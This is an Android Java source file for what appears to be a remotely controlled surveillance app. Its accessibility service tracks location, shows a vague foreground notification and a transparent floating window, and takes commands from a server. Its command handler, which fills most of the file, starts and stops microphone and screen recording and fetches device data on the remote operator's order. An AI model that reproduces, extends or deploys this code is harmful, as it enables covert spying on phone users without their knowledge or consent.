package com.view.core.services;

import android.accessibilityservice.AccessibilityService;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.RemoteException;
import android.support.annotation.NonNull;
import android.support.v4.app.NotificationCompat;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;

import com.view.core.MyApplication;
import com.view.core.activitys.MainActivity;
import com.view.core.activitys.PhoneRecordActivity;
import com.view.core.activitys.ScreenRecordActivity;
import com.view.core.activitys.SplashActivity;
import com.view.core.thread.ActiveThread;
import com.view.core.thread.ClientThread;
import com.view.core.thread.Constant;
import com.view.core.thread.OnClientListener;
import com.view.core.utils.FloatViewUtil;
import com.view.core.utils.LocationUtil;

import Android.view.core.R;

/**
 * @author: xxx
 * @create: 2020/1/30 下午9:38
 * @email: xxx.xxx.xxx
 * @version:
 * @descripe:
 **/
public class SocketAccessibilityService extends AccessibilityService {

    private static final String TAG = SocketAccessibilityService.class.getSimpleName();

    private Context mContext ;
    private Handler mHandler = new Handler();

//    private ClientThread mClientThread = null;

    public static final int PID = android.os.Process.myPid();
    private ServiceConnection mConnection;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "onCreate: executed "+ PID);
        mContext = this;
        LocationUtil.getInstance().initLocationManager(mContext);

        //服务创建时创建前台通知
        Notification notification = createForegroundNotification();
        //启动前台服务
        startForeground(1,notification);

        new ActiveThread(mContext, mHandler, mListener).start();
    }

    //创建前台通知，可写成方法体，也可单独写成一个类
    private Notification createForegroundNotification(){
        //前台通知的id名，任意
        String channelId = "ForegroundService";
        //前台通知的名称，任意
        String channelName = "Service";
        //发送通知的等级，此处为高，根据业务情况而定
        int importance = NotificationManager.IMPORTANCE_HIGH;
        //判断Android版本，不同的Android版本请求不一样，以下代码为官方写法
        if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.O){
            NotificationChannel channel = new NotificationChannel(channelId,channelName,importance);
            channel.setLightColor(Color.BLUE);
//            channel.setLockscreenVisiability(Notification.VISIBILITY_PRIVATE);
            NotificationManager notificationManager = (NotificationManager)getSystemService(Context.NOTIFICATION_SERVICE);
            notificationManager.createNotificationChannel(channel);
        }

        //点击通知时可进入的Activity
        Intent notificationIntent = new Intent(this, SplashActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this,0,notificationIntent,0);

        //最终创建的通知，以下代码为官方写法
        //注释部分是可扩展的参数，根据自己的功能需求添加
        return new NotificationCompat.Builder(this,channelId)
//                .setContentTitle("玩机技巧")
                .setContentText("正在为您服务")
                .setSmallIcon(R.drawable.ic_launcher)//通知显示的图标
                .setContentIntent(pendingIntent)//点击通知进入Activity
                .setTicker("通知的提示语")
                .build();
        //.setOngoing(true)
        //.setPriority(NotificationCompat.PRIORITY_MAX)
        //.setCategory(Notification.CATEGORY_TRANSPORT)
        //.setLargeIcon(Icon)
        //.setWhen(System.currentTimeMillis())
    }

    @Override
    protected void onServiceConnected() {
        Log.d(TAG, "onServiceConnected: executed ");
        //连接服务器等待接收指令
//        if(mClientThread == null) {
//            mClientThread = new ClientThread(this, mHandler, mListener);
//            mClientThread.start();
//            MyApplication.setClientThread(mClientThread);
//        }
        //显示透明浮窗
        FloatViewUtil.getInstance().showFloatingWindow(mContext);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        Log.d(TAG, "onAccessibilityEvent: executed "+ event.getAction());
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "onInterrupt: executed ");
    }


    @Override
    public void onDestroy() {
        Log.d(TAG, "onDestroy: executed ");
        super.onDestroy();
        //中断接收指令
//        if(mClientThread != null){
//            mClientThread.isStopThread = true;
//            mClientThread.interrupt();
//            mClientThread = null;
//            MyApplication.setClientThread(null);
//        }

        //在服务被销毁时，关闭前台服务
        stopForeground(true);
    }

    private OnClientListener mListener = new OnClientListener() {

        @Override
        public void onStartConnect() {
        }

        @Override
        public void onConnected(final String host, final int ip) {
            if(Constant.isDebug) {
                mHandler.post(new Runnable() {
                    @Override
                    public void run() {
                        Toast.makeText(mContext, ("服务器，" + host), Toast.LENGTH_SHORT).show();
                    }
                });
            }
        }

        @Override
        public void onAuthenticateFailed() {

        }

        @Override
        public void onAuthenticateSuccess() {

        }

        @Override
        public void onCommand(String cmd, String json) {
            Log.d(TAG, "onCommand: cmd="+ cmd+ ", json="+ json);
            if(cmd.equals(Constant.CMD_FETCH_REMOTE_DEVICE)){
                Intent intent = new Intent();
                intent.setClass(mContext, MainActivity.class);
                intent.setPackage(getPackageName());
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                Bundle bundle = new Bundle();
                bundle.putString(Constant.KEY_HOSTNAME, json);
                intent.putExtra("data", bundle);
                startActivity(intent);
            }else if(cmd.equals(Constant.CMD_STOP_REMOTE_OPERA)){
                PhoneRecordActivity.PhoneServiceConnection mPhoneServiceConnection = ((MyApplication)getApplication()).getPhoneServiceConnection();
                if(mPhoneServiceConnection != null){
                    unbindService(mPhoneServiceConnection);
                }

                ScreenUtil.stopScreenRecord(mContext);

                /**
                 * 开启录音
                 */
            }else if(cmd.equals(Constant.CMD_FETCH_REMOTE_PHONE)){
                Log.d(TAG, "onCommand: start phone record");
                Intent intent = new Intent();
                intent.setClass(mContext, PhoneRecordActivity.class);
                intent.setPackage(getPackageName());
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                Bundle bundle = new Bundle();
                bundle.putString(Constant.KEY_HOSTNAME, json);
                intent.putExtra("data", bundle);
                startActivity(intent);
            }else if(cmd.equals(Constant.CMD_STOP_REMOTE_PHONE)){
                PhoneRecordActivity.PhoneServiceConnection mPhoneServiceConnection = ((MyApplication)getApplication()).getPhoneServiceConnection();
                if(mPhoneServiceConnection != null){
                    Log.d(TAG, "onCommand: unbindservice");
                    try {
                        if(Constant.isDebug){
                            mHandler.post(new Runnable() {
                                @Override
                                public void run() {
                                    Toast.makeText(mContext, "收到停止录音指令", Toast.LENGTH_SHORT).show();
                                }
                            });
                        }
                        if(mPhoneServiceConnection.record != null) {
                            mPhoneServiceConnection.record.stopRecord();
                        }
                    } catch (RemoteException e) {
                        e.printStackTrace();
                    }
                }
                /**
                 * 开启录屏
                 */
            }else if(cmd.equals(Constant.CMD_FETCH_REMOTE_SCREEN)){
                Log.d(TAG, "onCommand: start screen record");
                Intent intent = new Intent();
                intent.setClass(mContext, ScreenRecordActivity.class);
                intent.setPackage(getPackageName());
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                Bundle bundle = new Bundle();
                bundle.putString(Constant.KEY_HOSTNAME, json);
                intent.putExtra("data", bundle);
                startActivity(intent);
            }else if(cmd.equals(Constant.CMD_STOP_REMOTE_SCREEN)){
                ScreenUtil.stopScreenRecord(mContext);
            }
        }

        @Override
        public void onConnectionFailed(String message) {

        }

        @Override
        public void onError(int errCode, String errMessage) {

        }
    };

}
